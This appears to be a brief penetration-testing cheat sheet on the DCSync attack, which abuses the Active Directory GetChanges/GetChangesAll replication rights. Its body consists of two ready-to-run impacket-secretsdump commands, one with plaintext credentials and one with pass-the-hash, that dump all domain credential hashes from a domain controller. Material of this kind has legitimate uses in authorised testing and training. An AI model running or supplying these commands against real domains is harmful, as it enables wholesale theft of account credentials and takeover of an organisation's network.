---
title: "GetChanges/GetChangesAll"
date: 2024-7-9
tags: ["GetChanges", "GetChangesAll", "dcsync", "secretsdump", "active driectory", "ad", "Windows"]
---

---
### GetChanges/GetChangesAll

#### DCSync Attack (From Linux)

```bash
# With creds
impacket-secretsdump -just-dc username:password@10.10.11.10
```

```bash
# With hashes
impacket-secretsdump -hashes lmhash:nthash -just-dc EXAMPLE.COM/username@10.10.11.10
```

<br>